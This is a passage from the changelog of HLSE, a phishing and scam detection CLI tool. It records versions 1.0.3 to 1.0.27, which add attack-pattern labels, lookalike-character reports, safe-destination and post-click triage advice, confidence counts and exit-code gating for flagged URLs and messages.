  multi-tactic social engineering attempt". Displayed as `⚖ Confidence:` in text
  output after `▸ Pattern:`. Added as `"signal_count"` (int) and `"confidence"`
  (string) in JSON text verdicts. 5 new CLI integration tests (298 total).
  Zero warnings. F1 = 1.000 preserved.

## [1.0.27] — 2026-06-17

### Added
- **Perspective 27: Text triage for post-response users (`hlse_text_triage`).**
  Socratic question: "URL verdicts have `⚑ If already clicked:` triage. But BEC,
  tech-support, and grandparent-emergency victims don't click a URL — they REPLY
  to an email, call a phone number, or act on a voice instruction. By the time
  they reach HLSE, the harmful action may already be done. A BEC victim who just
  sent a wire needs to know: 'call your bank's fraud line within 72 hours and
  request SWIFT recall' — not read 'BLOCK [100]'. A tech-support victim who gave
  remote access needs: 'disconnect from the internet immediately'. Shouldn't
  text threats ≥ 60 have the same temporal triage as URL threats?"
  New `hlse_text_triage(const TextVerdict *v)` (public API) calls
  `hlse_classify_text_attack()` and maps the pattern to a specific 60-second
  action: BEC/CEO-fraud → SWIFT recall guidance; ClickFix → disconnect and
  reinstall; tech-support → hang up, revoke remote access; grandparent scam →
  call the family member directly on a known number; ransom → do not pay, report;
  investment scam → stop transfers, contact bank; quishing → check address bar;
  callback/vishing → do not call the number in the message. Displayed as
  `⚑ If you acted:` (distinct from the URL triage label `⚑ If already clicked:`).
  Added as `"triage"` in JSON text verdicts at score ≥ 60. 6 new CLI integration
  tests (293 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.26] — 2026-06-17

### Fixed
- **Stdin pipe mode text advisory consistency.** The `--stdin` pipe mode showed
  `▸ Pattern:` and `↺ Could be benign:` for URL inputs (via `print_url_advisories`)
  but silently omitted both for text inputs. A `LOG [25] "your account is
  suspended"` line in stdin mode showed only the raw reason string with no
  pattern label and no exoneration — while the `text` subcommand and default
  auto-detect paths both showed them. The stdin text branch now builds a
  `TextVerdict` from the `ScanResult`, calls `hlse_classify_text_attack()` for
  the pattern, and calls `hlse_exoneration_for("text", score)` for the benign
  explanation, matching the output of all other text display paths. URL inputs
  in stdin mode now also show the pattern-aware `hlse_url_exoneration()` result.
  Zero warnings. F1 = 1.000 preserved.

## [1.0.25] — 2026-06-17

### Added
- **Perspective 26: Exoneration field in JSON output.**
  The `↺ Could be benign:` explanation is visible in human-readable text output
  for LOG/ALERT verdicts (score 15–59) but was absent from JSON. Library and
  pipeline consumers parsing JSON had no access to this field, forcing them to
  re-implement the benign-explanation logic — or silently omit it from their UI.
  Both `print_json_url()` and `print_json_text()` now emit `"exoneration"`
  when the score is in the LOG/ALERT band [15, 59]. For URL verdicts this uses
  the pattern-aware `hlse_url_exoneration()` (added in Perspective 24). For text
  verdicts this uses `hlse_exoneration_for("text", score)`. The field is absent
  (not `null`) when score ≥ 60 or score = 0. 5 new CLI integration tests (287
  total). Zero warnings. F1 = 1.000 preserved.

## [1.0.24] — 2026-06-17

### Added
- **Perspective 25: Text attack pattern classification (`hlse_classify_text_attack`).**
  Socratic question: "`hlse_classify_url_attack` gives URL verdicts a `▸ Pattern:`
  label ('typosquat credential-harvest', 'authority-trick credential phishing').
  Text verdicts above score 0 show only raw reason strings and a generic
  exoneration. A BEC wire-transfer fraud and a grandparent emergency scam both
  say 'Urgency pressure (N hits)' — but they need entirely different responses:
  BEC requires immediate CFO chain verification; grandparent scam requires
  calling the family member directly. Shouldn't text verdicts also name the
  attack pattern so the response is directed to the right playbook?"
  New `hlse_classify_text_attack(const TextVerdict *v)` (public API) scans
  reason strings for signal names and amplifier labels, then maps them to a
  named tactic in priority order:
  - `ClickFix script-injection lure (paste-and-run attack)`
  - `BEC / CEO-fraud wire-transfer`
  - `business email compromise (BEC) wire-transfer fraud`
  - `tech-support gift-card scam`
  - `lottery / advance-fee fraud`
  - `ransom / extortion message`
  - `investment scam / pig-butchering`
  - `emergency impersonation scam (grandparent / fake-kidnapping)`
  - `QR-code phishing (quishing)`
  - `callback phone scam (TOAD / vishing)`
  - `authority impersonation phishing`
  - `urgency credential-harvest phishing`
  - `urgency social engineering`
  - `credential / payment lure` and others
  Displayed as `▸ Pattern:` in text output. Added as `"pattern"` in JSON text
  verdict. `hlse_core.h` now includes `hlse_text.h` so `TextVerdict` is visible.
  6 new CLI integration tests (282 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.23] — 2026-06-17

### Added
- **Perspective 24: Pattern-aware exoneration (`hlse_url_exoneration`).**
  Socratic question: "`hlse_exoneration_for('url', score)` returns 'heuristic —
  legitimate small businesses also use hyphens and words like secure/login' for
  EVERY LOG/ALERT URL — including URL shorteners (bit.ly), DGA-style domains,
  free-hosting pages, and typosquats. A shortener LOG user reads 'hyphens and
  login words' and is completely confused — their URL has no hyphens. The
  falsifying test ('does the registrable domain belong to the brand?') is
  unanswerable for a shortener because the registrable domain IS the shortener
  (bit.ly). The exoneration isn't just generic — for shorteners it's actively
  wrong. Shouldn't the benign explanation match the actual signal?"
  New `hlse_url_exoneration(const Verdict *v)` (public API) calls
  `hlse_classify_url_attack()` to get the pattern and maps it to a specific
  exoneration:
  - **shortener/obfuscated**: "URL shorteners are standard tools for
    social-media links and marketing; expand with '+' (bit.ly+, tinyurl+) to
    see the destination first"
  - **free-hosting**: "developers legitimately host on GitHub Pages/Netlify;
    search the exact domain to find the owner"
  - **subdomain spoofing**: "read the domain right-to-left — the registrable
    part just before the first '/' must belong to the brand"
  - **typosquat/lookalike**: "typing errors are common; confirm this was the
    intended URL"
  - **DGA/high-entropy**: "search the domain in a search engine — legitimate
    services have traceable history"
  - **high-risk TLD**: "find the brand via bookmark and compare the domain"
  - **@-trick**: "paste into a URL decoder to see where you land"
  - Falls back to the original `hlse_exoneration_for("url", score)` for
    unrecognised patterns. `hlse_exoneration_for()` preserved for compat.
  5 new CLI integration tests (276 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.22] — 2026-06-17

### Added
- **Perspective 23: Compound first-response triage for multi-brand co-spoof URLs
  (`hlse_compound_triage`).**
  Socratic question: "`hlse_triage_for()` calls `hlse_attacker_objective()` which
  returns the FIRST brand's objective. For a PayPal+Apple co-spoof attack the
  `⚑ If already clicked:` line says 'call the number on the back of your card' —
  correct for PayPal, but completely silent on Apple ID. Apple ID is the identity
  keystone that can reset every other account the victim owns. In a compound
  attack the user has TWO concurrent incident-response obligations. If they
  prioritise the bank call and miss the Apple ID reset window, the attacker
  still controls the recovery gateway for their entire account ecosystem. Shouldn't
  the triage line cover both?" New `hlse_compound_triage(const Verdict *v, char *out,
  size_t outsz)` (public API) collects both impersonated brands' objective classes,
  maps each to a concise triage imperative via the new static helper
  `triage_imperative()`, and for n_brands >= 2 writes a numbered two-step sequence:
  `"(1) call the number on the back of your card to freeze it…; (2) change that
  email/identity password, revoke all sessions…"`. For n_brands == 1 writes the
  same result as `hlse_triage_for()`. `hlse_triage_for()` preserved for backward
  compat. Both text `⚑ If already clicked:` and JSON `"triage"` field updated.
  8 new CLI integration tests (271 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.21] — 2026-06-17

### Added
- **Perspective 22: Compound safe destination for multi-brand co-spoof URLs
  (`hlse_safe_destinations`).**
  Socratic question: "`hlse_compound_objective` already says 'compound theft —
  paypal (financial) AND apple (identity) both targeted simultaneously' and
  `hlse_cascade_risk` says 'audit BOTH credential classes'. But `→ Safe
  destination:` shows only `https://paypal.com` — leaving the user with no
  navigable address for their Apple account. The compound framing is now
  logically inconsistent: three lines name both brands, one names only one.
  Should both legitimate destinations appear on that line?" New
  `hlse_safe_destinations(const Verdict *v, char *out, size_t outsz)` (public
  API) extends `hlse_safe_destination()` to collect ALL impersonated brand
  domains from the verdict's "Legitimate '<brand>': <domain>" reason strings.
  For n_brands == 1 it writes `"https://<domain>"` identically to the original.
  For n_brands >= 2 it writes `"https://<domain1> and https://<domain2>"` so the
  `→ Safe destination:` line is coherent with `▸ Pattern: multi-brand co-spoof`,
  `◉ Attacker's goal: compound theft — …`, and `⊕ Also change: two credential
  classes…`. Both text output and JSON `"safe_url"` field use
  `hlse_safe_destinations()`; the original `hlse_safe_destination()` is preserved
  for library backward compat. 8 new CLI integration tests (263 total). Pure
  output — no scoring change, F1 = 1.000 preserved; zero warnings.

## [1.0.20] — 2026-06-17

### Added
- **Perspective 21: Detection confidence / corroboration count (`hlse_confidence_for`).**
  Socratic question: "Your score says HOW threatening, but two verdicts both
  scoring 60 can be epistemically worlds apart: one from a single homoglyph
  detector barely crossing threshold, another from homoglyph + path + TLD +
  structure all agreeing. The first might be a fragile-heuristic false positive;
  the second is corroborated by four independent detectors. A SOC analyst
  triaging a borderline score has no way to tell which they're looking at.
  Shouldn't the output disclose how many independent signals concur?" New
  `hlse_confidence_for(const Verdict *v, char *out, size_t outsz)` (public API)
  counts DISTINCT detector families — collapsing reasons from the same technique
  (e.g. "Brand homoglyph" + "Multiple confusable chars" → one family) and
  excluding the derived "Legitimate '<brand>'" canonical evidence lines — then
  maps the count to a qualitative label: 1 → "single signal — corroborate
  independently before acting on a borderline score"; 2 → "corroborated by N
  independent signals"; 3+ → "high confidence — N independent detector families
  agree; this is a deliberate, multi-faceted spoof". Returns the family count.
  This is the epistemic complement to the score: magnitude vs. evidentiary
  weight. Displayed as `⚖ Confidence:` directly after `▸ Pattern:` in text;
  added as `"signal_count"` (integer) and `"confidence"` (label) in JSON — both
  machine-usable for SOC triage rules ("auto-close single-signal ALERTs",
  "page on-call for 4+ signal ISOLATEs"). 7 new CLI integration tests (255
  total). Pure output — no scoring change, F1 = 1.000 preserved; zero warnings.

## [1.0.19] — 2026-06-16

### Added
- **Perspective 20: ASCII lookalike character diff (`hlse_ascii_diff`).**
  Socratic question: "You report 'paypa1' vs 'paypal' as a homoglyph and your
  own verify guidance says 'compare the address bar character by character' —
  without saying WHICH character. In a proportional-font browser, digit '1' and
  letter 'l' are visually indistinguishable. What if you pointed to EXACTLY
  which position is the impostor: 'char 6 is digit 1, masking letter l'? That
  turns 'edit distance 1' from an abstract metric into proof the user can
  physically verify in their address bar right now." New `hlse_ascii_diff(const
  Verdict *v, char *out, size_t outsz)` (public API, caller-owned buffer) parses
  `"Brand homoglyph: 'X' -> 'Y'"` and `"Typosquat: 'X' is edit distance N from
  'Y'"` reasons, aligns the two strings character by character, and reports every
  differing position with its character type (digit/letter/hyphen). For single
  substitutions: `"'paypa1.com': char 6 is digit '1', masking letter 'l'"`. For
  multiple (e.g., `g00gle`): `"'g00gle.com': char 2 digit '0'→'o', char 3 digit
  '0'→'o'"`. Deliberately skips reasons where the fake string contains non-ASCII
  bytes — those are covered by `hlse_confusable_report()` with richer Unicode
  context. Displayed as `⌖ ASCII lookalike:` after `⌖ Disguised char:` in text
  output; added as `"ascii_diff"` field in JSON. 8 new CLI integration tests
  (248 total). F1 = 1.000 preserved; zero warnings.

## [1.0.18] — 2026-06-16

### Added
- **Perspective 19: Compound objective for multi-brand co-spoof (`hlse_compound_objective`).**
  Socratic question: "`hlse_attacker_objective()` names the primary target precisely
  — but for multi-brand co-spoof URLs (Perspective 17) it returns only the FIRST
  brand's objective. A user phished for PayPal AND Apple ID simultaneously faces
  two compromised credential classes, not one. The `◉ Attacker's goal` line showed
  'financial-account takeover', leaving Apple ID's identity-credential risk
  completely unnamed. The second objective isn't redundant noise — it determines
  what the user must protect next." New `hlse_compound_objective(const Verdict *v,
  char *out, size_t outsz)` (public API, caller-owned buffer): for single-brand URLs
  writes the same full descriptive objective as `hlse_attacker_objective()`; for
  multi-brand co-spoof writes "compound theft — paypal (financial) AND apple
  (identity) both targeted simultaneously in a single click". The three advisory
  lines for co-spoof URLs now form a coherent compound narrative: `▸ Pattern:
  multi-brand co-spoof`, `◉ Attacker's goal: compound theft — paypal (financial)
  AND apple (identity)`, `⊕ Also change: two credential classes...`. `print_url_
  advisories()` and `print_json_url()` both updated to use the new function.
  Also added `brand_objective_class()` static helper (one-word category label:
  "financial", "crypto", "identity", "corporate", etc.) used to build the terse
  compound summary. 7 new CLI integration tests (240 total). F1 = 1.000 preserved;
  zero warnings.

## [1.0.17] — 2026-06-16

### Added
- **Perspective 18: Password-reuse cascade risk (`hlse_cascade_risk`).**
  Socratic question: "You've named the primary target and given triage guidance
  for that account. But credential-stuffing bots test stolen logins against
  hundreds of services within minutes — and 65 % of users reuse passwords. If
  the victim's PayPal password also protects their Gmail, the attacker now
  controls the recovery address for every other account. Shouldn't post-click
  guidance name the accounts most likely to fall in a cascade, not just the one
  they were phished for?" New `hlse_cascade_risk(const Verdict *v)` function
  (public API) returns a static string describing which related accounts to audit
  after a credential-harvest click, keyed to the impersonated brand's objective
  class (financial → email+banking+payment apps; identity/email → all accounts
  that use this email for reset; crypto → other exchanges + irreversibility note;
  corporate → IT team + SSO/VPN; etc.). For multi-brand co-spoof URLs
  (Perspective 17) the guidance explicitly names BOTH credential classes as
  simultaneously harvested. Fires only at score ≥ 60 (BLOCK/ISOLATE) — the
  "already clicked" context where cascade damage is possible. Wired into:
  `print_url_advisories()` (all three text output paths via the centralised
  helper), `print_json_url()` as `"cascade_risk"` field, and the `⊕ Also
  change:` advisory line. 8 new CLI integration tests (233 total). F1 = 1.000
  preserved; zero warnings.

## [1.0.16] — 2026-06-16

### Added
- **Perspective 17: multi-brand co-spoof pattern label.**
  Socratic question: "Single-brand detection assumes one attacker wearing one
  mask. But what if the URL simultaneously impersonates two known brands —
  'paypal.apple-secure.com', 'microsoft.apple-support.net'? Presenting as two
  brands at once exploits both user bases; each fragment looks 'almost right' in
  isolation, making the compound deception harder to dismiss. Shouldn't a
  fundamentally different attack label surface this?" `hlse_classify_url_attack()`
  now counts distinct `"Legitimate '…'"` canonical-brand reasons in the verdict.
  When two or more are present, it returns `"multi-brand co-spoof (compound
  impersonation)"` ahead of all single-brand pattern labels (after IDN, which
  describes the disguise mechanism rather than the brand count). Pure output
  addition — no scoring change, F1 = 1.000 preserved. 8 new CLI integration tests.

### Fixed
- **`--from` channel boost now raises the process exit code.** The delivery-
  channel feature (`--from qr/sms/email/dm`) boosted the displayed score and
  action label but left the process exit gate comparing the raw score against
  `g_fail_threshold`. A URL scoring 55 (ALERT, exits 0) with `--from qr`
  (+20 → 75, shown as BLOCK) still exited 0 — inconsistent with what was
  displayed. Both the default single-URL path and the stdin `--stdin` loop now
  compute `eff_gate = raw_score + channel_delta` before the threshold test.
  Verified: `support-helpdesk.info/reset` (score 55) exits 0 without `--from`
  and exits 1 with `--from qr`. 4 new exit-gate tests.

## [1.0.15] — 2026-06-16

### Changed
- **DRY refactor: centralised the per-URL advisory output into one helper.**
  Audit of Perspectives 9–16 found the six synthesis lenses (Pattern,
  Disguised char, Attacker's goal, Safe destination, Verify, Triage) were
  copy-pasted across all three text output sites (stdin / `text` subcommand /
  default auto-detect) — ~13 identical lines each. Every new perspective forced
  an edit to all three in lockstep, a standing drift risk (the three could
  silently diverge). Extracted `print_url_advisories(const char *url, const
  Verdict *)` as the single source of truth; the three sites now call it. No
  behavioural change — output is byte-for-byte identical (verified by two new
  advisory-parity tests asserting the three paths produce the same advisory
  lines). F1 = 1.000 preserved.

### Fixed
- **Hardened `hlse_safe_destination()` buffer guard.** Once the function was no
  longer inlined at every call site (post-refactor), GCC's `-Wformat-truncation`
  correctly observed the `outsz == 0` guard left buffers of size 1..8 unable to
  hold the `"https://"` prefix. Tightened the guard to `outsz < 10` (a usable
  destination needs at least "https://" + one host char + NUL), restoring the
  zero-warning build and making the contract explicit. No caller is affected
  (all pass MAX_URL-sized buffers).
- **Consistency: `text` subcommand OK-path now surfaces canonical
  confirmation.** Perspective 16's `✔ Canonical:` line was wired into the stdin
  and default OK-paths but not the `text` subcommand's, so `hlse_core text
  "https://paypal.com"` lacked the positive-authentication line the other two
  paths emit. Added it for parity.

## [1.0.14] — 2026-06-16

### Added
- **Canonical confirmation — the "positively confirmed safe" lens**
  (NEW-PERSPECTIVE-CANONICAL-CONFIRM). Socratic question: "When you output 'OK'
  for https://paypal.com you're saying 'I found nothing wrong' — absence of
  evidence. But you KNOW paypal.com is the exact canonical PayPal domain — you
  used that fact to detect paypa1.com. For this URL you have POSITIVE evidence
  of legitimacy, not just absence of threat signals. 'This is the authenticated
  PayPal domain confirmed by the HLSE brand registry' is a stronger statement
  than 'I found nothing suspicious.' Why not say that?"  All prior perspectives
  serve the threat path. This closes the other half: every `OK` verdict for a
  URL whose host exactly matches a registered canonical brand domain (from
  `brand_canonical()`) is upgraded from a bare "nothing found" to a positive
  authentication statement.  New `hlse_canonical_confirm(const char *url, char
  *brand_out, size_t)` (public API) extracts the host, strips an optional
  leading `www.`, and checks it against all entries in the BRANDS[] table.
  Fires only at score == 0 (a fake domain never equals the canonical, so a
  genuine threat verdict can never produce a false confirmation). Human output
  gains a `✔ Canonical: confirmed authentic <brand> domain (HLSE brand
  registry)` line between the OK header and the blind-spot note, replacing the
  weaker epistemic "absence of threat" with the stronger "positive match"; JSON
  gains a `"canonical_brand"` field. Non-brand clean URLs and all threat URLs
  emit nothing. Pure output, zero scoring change: F1 = 1.000 preserved. 8 new
  CLI integration tests cover paypal.com, www-prefix stripping (www.zoom.us →
  zoom.us), a non-obvious canonical TLD (zoom.us), the non-brand clean negative,
  the threat-URL negative, JSON field presence/absence, and stdin pipe.

## [1.0.13] — 2026-06-16

### Added
- **Incident triage — the "if you already clicked" lens**
  (NEW-PERSPECTIVE-TRIAGE). Socratic question: "The verdict assumes the user
  saw HLSE's output BEFORE clicking. But people typically notice something's
  wrong AFTER submitting credentials. At that moment 'BLOCK' and a list of
  structural reasons is useless — they need triage: what to do in the next 60
  seconds to minimise damage. Does HLSE serve the post-click user at all?"
  All prior perspectives serve the decision-point (before or during): blind
  spot, exoneration, and verify are pre-click; pattern, objective, and safe
  destination are also pre-action. The post-click user needs an entirely
  different answer. New `hlse_triage_for(const Verdict *)` (public API) emits
  first-response triage keyed to the same brand-objective class as
  `hlse_attacker_objective`, so the guidance matches the specific asset at
  risk: crypto seed phrase → move funds to a new wallet immediately (irrevers-
  ible); financial/banking → call the card-back number to block; identity/email
  → change password and revoke sessions (resets everything); corporate SSO →
  notify IT within minutes (lateral movement window); social → change password
  and warn contacts (next target); telecom → add SIM-lock PIN; AI/API key →
  revoke in provider console; gaming → enable 2FA now. Fires only at score >=
  60 (BLOCK/ISOLATE), so it never fires in the same verdict as exoneration
  (15..59). Human output gains a `⚑ If already clicked: <triage>` line; JSON
  gains a `"triage"` field. Pure output, zero scoring change: F1 = 1.000
  preserved. 9 new CLI integration tests cover payment/corporate/crypto
  categories, the band boundary (absent at ALERT), JSON field presence/absence,
  the clean/text negatives, and stdin pipe.

## [1.0.12] — 2026-06-15

### Added
- **Independent verification — the "how to check me without trusting me" lens**
  (NEW-PERSPECTIVE-VERIFY). Socratic question: "You're a heuristic engine with
  no network, no certificate inspection, no ground truth. A user about to type
  their password is betting on your word alone. What ONE check can they run
  right now — one that doesn't require trusting you — to confirm the verdict
  before they act or report it?"  This is the high-confidence mirror of the
  exoneration lens: `hlse_exoneration_for` serves the LOG/ALERT band (15..59)
  with the benign explanation and a test that *clears* the doubt; the new
  `hlse_verification_for(const Verdict *)` (public API) serves the BLOCK/ISOLATE
  band (>=60) with a test that lets the user *confirm* the threat themselves.
  The two bands are disjoint, so at most one of the two lines ever appears.
  The check is chosen from the signals that fired so it targets the actual
  deception — expand-the-shortener for hidden destinations, read-after-the-'@'
  for authority tricks, bare-IP-is-fake for IP hosts, reach-via-bookmark for
  homoglyph/IDN, read-right-to-left for subdomain/free-host spoofing, and a
  trusted-channel fallback. Human output gains a `✓ Verify independently:
  <check>` line; JSON gains a `"verify"` field. Pure output, zero scoring
  change: F1 = 1.000 preserved. 8 new CLI integration tests assert the BLOCK/
  ALERT band split (verify vs exoneration are mutually exclusive), the clean
  negative, and JSON field presence/absence.

## [1.0.11] — 2026-06-15

### Added
- **Confusable forensics — the "show the disguise" lens**
  (NEW-PERSPECTIVE-CONFUSABLE). Socratic question: "You said 'mixed-script
  homoglyph' and then showed the user the very string their eyes already
  glossed over — `раypal.com` looks identical to `paypal.com`. Which exact
  character is the impostor? Naming it ('position 1 is Cyrillic U+0440, not an
  ASCII letter') turns an abstract label into undeniable, teachable proof a
  browser's address bar actively hides."  The deception in an IDN/mixed-script
  attack lives at the codepoint level, yet every prior reason re-displayed the
  same indistinguishable glyphs.  New `hlse_confusable_report(const char *url,
  char *out, size_t)` (public API) walks the host, decodes the first non-ASCII
  UTF-8 codepoint, and reports its 1-based position, `U+XXXX` value, and
  Unicode script block (Cyrillic, Greek, Armenian, fullwidth, …).  Human output
  gains a `⌖ Disguised char: <detail>` line after the attack-pattern label;
  JSON gains a `"confusable"` field.  Deliberately scoped to raw non-ASCII
  hosts only: pure-ASCII homoglyphs (`g00gle`, `paypa1`) are already spelled
  out in the brand-homoglyph reason, and `xn--` punycode hosts are ASCII and
  covered by the IDN reason — so the lens fires exactly where existing output
  was least informative, with no duplication.  Shown across all three URL paths
  (single-arg, default, `--stdin`).  Pure output, zero scoring change: F1 =
  1.000 preserved.  6 new CLI integration tests cover the Cyrillic case, the
  pure-ASCII and clean negatives, JSON field presence/absence, and stdin pipe.

## [1.0.10] — 2026-06-15

### Added
- **Attacker objective — the "what are they after?" lens**
  (NEW-PERSPECTIVE-OBJECTIVE). Socratic question: "You named HOW the attack
  works (the pattern) and WHERE the user should go instead (safe destination) —
  but never WHAT the attacker is actually after. 'A phishing page' is abstract
  and easy to shrug off; 'they want your crypto seed phrase, and that theft is
  irreversible' names the exact asset the victim must treat as compromised
  right now. Doesn't the stake decide how hard the user should care?"  The same
  `BLOCK [60]` verdict carries wildly different real-world stakes by brand: a
  fake Netflix page risks a stored card, a fake MetaMask page risks an
  irreversible wallet drain, a fake Okta page risks the user's whole employer.
  Where `hlse_classify_url_attack` describes the *mechanism*, the new
  `hlse_attacker_objective(const Verdict *)` (public API) describes the *motive
  and the asset at stake*, derived from which brand was impersonated. Brands
  are bucketed into 12 objective classes (crypto/irreversible, financial,
  password-vault, email-identity keystone, corporate-SSO, social, subscription,
  gaming, delivery-fee, fake-AV, AI/API-key, telecom/SIM-swap) with a generic
  credential-harvest fallback for any other identified brand. Human output gains
  a `◉ Attacker's goal: <objective>` line; JSON gains an `"objective"` field.
  Shown across all three URL paths (single-arg, default, `--stdin`) and only
  when a brand was impersonated — clean URLs and text inputs emit nothing. Pure
  output, zero scoring change: F1 = 1.000 preserved. 8 new CLI integration
  tests cover the crypto/payment/identity classes, JSON field presence/absence,
  stdin pipe, and the clean/text negative paths.

## [1.0.9] — 2026-06-15

### Added
- **Safe destination — the "did-you-mean" lens** (NEW-PERSPECTIVE-SAFE-DEST).
  Socratic question: "You blocked the counterfeit — but the user still has the
  legitimate need that made them click. Saying only 'no' leaves them to
  re-search straight back into the same phishing net. You already know the real
  domain — you used it to detect the fake. Shouldn't you hand it over as a
  navigable destination?"  Detection so far stopped at *naming* the threat;
  it never closed the loop into *guidance toward safety*.  Perspective 8
  already derives the authentic brand domain and records it as the evidence
  reason `Legitimate '<brand>': <domain>` — but that fact sat buried among the
  signals.  New `hlse_safe_destination(const Verdict *, char *out, size_t)`
  (public API) lifts it into an actionable, navigable `https://<domain>` URL.
  Human output gains a prominent `→ Safe destination: https://<domain>` line
  after the attack-pattern label; JSON output gains a `"safe_url"` field.
  Shown across all three URL paths (single-arg, default auto-detect, `--stdin`)
  and only when a brand was actually impersonated — clean URLs and text inputs
  emit nothing, keeping output noise-free.  Pure output, zero scoring change:
  F1 = 1.000 preserved.  8 new CLI integration tests cover the typosquat and
  homoglyph cases, the navigable-URL format, JSON `safe_url` presence/absence,
  stdin pipe, and the clean/text negative paths.

## [1.0.8] — 2026-06-15

### Added
- **Delivery-channel context — the threat-prior lens** (NEW-PERSPECTIVE-CHANNEL).
  Socratic question: "You analysed the URL — but HLSE has no idea how it
  reached you. A QR code in a parking meter and a link you typed yourself
  carry the same bytes yet very different priors. Should the channel change
  the verdict?"  The delivery channel is an independent threat signal that URL
  structure cannot encode.  New `--from email|sms|dm|qr|manual` flag lets
  callers supply this context.  The channel is applied as a score boost on URL
  verdicts (non-URL inputs are unaffected): QR +20 (quishing, destination is
  masked), SMS +15 (primary smishing vector), email +10 (classic phishing),
  DM +10 (social-engineering via messaging), manual ±0 (user typed it).  The
  effective score drives the displayed action tier; the raw score is still
  emitted so consumers can see both.  JSON output gains `"channel"`,
  `"channel_delta"`, `"effective_score"`, and `"effective_action"` fields.
  Human text output emits a `· Channel (<ch>): +N — <rationale>` reason
  bullet after the structural signals.  `--from manual` is the explicit
  opt-in to "no prior" and emits no bullet to keep clean-URL output noise-free.
  12 new CLI integration tests cover each channel, JSON field, stdin pipe,
  text-input passthrough, and the `--from <unknown>` error path.

## [1.0.7] — 2026-06-15

### Fixed
- **`--stdin` pipe mode ignored `--fail-on` (exit gate hardcoded at BLOCK/60).**
  Self-audit of the `--fail-on` feature (1.0.x) found that its claim of "all
  exit sites honour the configurable gate" missed `stdin_mode`, which is the
  *primary* CI batch path. It set `any_threat` on a hardcoded `score >= 60`,
  so `--stdin --fail-on log` (or `alert`) silently passed LOG/ALERT-tier
  findings that the equivalent single-argument invocation would fail on. Now
  uses `g_fail_threshold` like every other exit site. Default behaviour
  (gate at 60) is unchanged. (Required moving the `g_fail_threshold`
  definition above `stdin_mode`.)

### Changed
- **`--stdin` text output now carries the `▸ Pattern:` attack-class label**,
  matching the `--json` pipe output (which already emitted `pattern`) and the
  single-artifact human output. Previously the human-readable batch path was
  the only one missing the synthesized threat class.

## [1.0.6] — 2026-06-15

### Fixed
- **Duplicate canonical-domain reason when multiple brand detectors fire.**
  Self-audit of the 1.0.4 canonical-domain feature: a URL like
  `paypal.evilsite.netlify.app` trips *both* the subdomain-spoof and the
  free-hosting detectors, each of which emitted its own
  `Legitimate 'paypal': paypal.com` line — so the canonical appeared twice,
  reading as a duplicate and consuming two of the verdict's 12 reason slots
  (which can push a real detection signal out of the buffer). Introduced a
  single `add_brand_canonical()` helper that looks up the canonical, skips it
  if an identical reason is already present, and adds it with zero score
  delta. This also removes the copy-pasted `brand_canonical()`/`add_reason()`
  boilerplate from all 14 brand-detection sites (DRY). Behaviour is identical
  for single-detector cases; F1 = 1.000 preserved. New regression test asserts
  exactly one canonical line for a repeated-brand URL.

## [1.0.5] — 2026-06-15

### Added
- **Attack pattern synthesis — the named-threat classification lens**
  (NEW-PERSPECTIVE-PATTERN). Socratic question: "You listed five signals —
  what do they add up to?" HLSE outputs individual detection reasons but
  silently assumed users could synthesize them into a named threat class.
  A new `hlse_classify_url_attack(Verdict *)` function (exposed in the
  public API) scans the fired signals and maps them to a terse attack-class
  label using priority-ordered rules: IDN/Unicode impersonation, visual
  homoglyph, @-authority-trick, IP-hosted brand, free-hosting phishing
  infrastructure, subdomain-spoof, typosquat (with and without a path),
  brand-hyphen, classic credential-harvest, brand+TLD, shortener, DGA.
  The label appears in text output as `▸ Pattern: <class>` after the
  per-signal reasons, and in `--json` output as `"pattern":<string>`.
  Score and F1 are unaffected (classifier is read-only, zero delta).
  7 new integration tests: each major attack class is verified, including
  "clean URL has no Pattern line." 151 total CLI tests, 0 failures.

## [1.0.4] — 2026-06-15

### Added
- **Canonical domain — the contrastive truth lens**
  (NEW-PERSPECTIVE-CANONICAL). Socratic question: "You've named the deception
  — where should I actually go?" Every brand-detection path (typosquat, digraph
  homoglyph, confusable-character, II→ll, mixed-script, IDN homograph, subdomain
  spoofing, brand+security-word hyphenation, brand+suffix-word fusion, brand in
  hyphenated SLD, free-hosting phishing, IP-host with brand in path) already
  knows *which brand* is being impersonated because it matched against the
  BRANDS[] table — yet the output named only the deception. It never said where
  to actually go. A new `brand_canonical()` lookup (108 brands → authoritative
  domain, covering non-obvious cases: `zoom → zoom.us`, `notion → notion.so`,
  `twitter → x.com`, `cashapp → cash.app`, `line → line.me`,
  `telegram → telegram.org`) surfaces the truth alongside every impersonation
  warning as a zero-score-delta `"Legitimate '<brand>': <domain>"` reason. The
  canonical appears in both text and `--json` output. Score is unaffected (delta
  0, informational only); F1 = 1.000 preserved. Tests: 5 new integration checks
  verify typosquat, homoglyph, brand-impersonation, and non-obvious canonical
  cases; the `zoom.us` assertion guards against the common mistake of using the
  wrong regional domain.

## [1.0.3] — 2026-06-13

Socratic probe of the five modules that had no dedicated coverage check this
cycle (network, secrets-Azure, audit-persistence, email-auth, multilingual
text). Each finding below started from a question — "why would this ever be
legitimate?" — and closed a concrete gap without moving F1 off 1.000 on either
the in- or out-of-distribution corpus.

### Added
- **Exoneration — the benign explanation for a heuristic threat**
  (NEW-PERSPECTIVE-EXONERATION). Socratic mirror of the blind-spot lens: that
  one hedges a clean `OK` ("might be wrong, here's what I can't see"); HLSE
  stated *threats* as if certain. But a hyphenated small-business domain or a
  security vendor's "secure-login" site trips heuristics legitimately. On a
  LOG/ALERT-band threat (score 15–59 — where false positives live), the
  `url`/`text`/`email` checks now print `↺ Could be benign:` with the innocent
  explanation **and the falsifying test** ("were you expecting this link; does
  the registrable domain belong to the real brand?"). High-confidence
  BLOCK/ISOLATE threats (homoglyph, `@`-trick, clipboard swap) are *not* hedged.
  Together with blind-spot, HLSE is now honest about uncertainty in both
  directions — clean and threat.
- **`--fail-on <tier>` — the machine consumer's risk gate**
  (NEW-PERSPECTIVE-FAILON). Socratic reframing: five perspectives enriched
  *text for a human*, but HLSE is most deployed as a CI gate / pre-commit hook /
  pipeline filter — read by a *script*, via the *exit code*. The exit code
  collapsed five severity tiers into pass/fail at a hardcoded BLOCK(60),
  imposing the author's risk posture on every consumer. A payments repo may want
  to fail the build at ALERT(40); a noisy docs repo only at ISOLATE(80). New
  `--fail-on log|alert|block|isolate|0-100` sets the score at/above which the
  process exits 1 (default block/60, fully backward-compatible). Applies to all
  single-artifact checks and to `scan` (which now gates its exit on the chosen
